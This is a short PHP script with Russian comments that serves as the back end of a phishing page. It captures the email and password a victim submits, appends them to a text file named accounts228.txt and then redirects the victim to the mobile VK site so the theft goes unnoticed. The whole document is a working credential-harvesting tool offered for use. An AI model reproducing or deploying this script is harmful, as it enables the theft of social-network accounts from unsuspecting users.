<?PHP
//**Private-Skripts**\\
//**Скриптик**\\
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("accounts228.txt","at"); //тут короче название куда будут сохрянться.txt
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='REFRESH' CONTENT='0; URL=https://m.vk.com'></head></html>"; //ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
?>
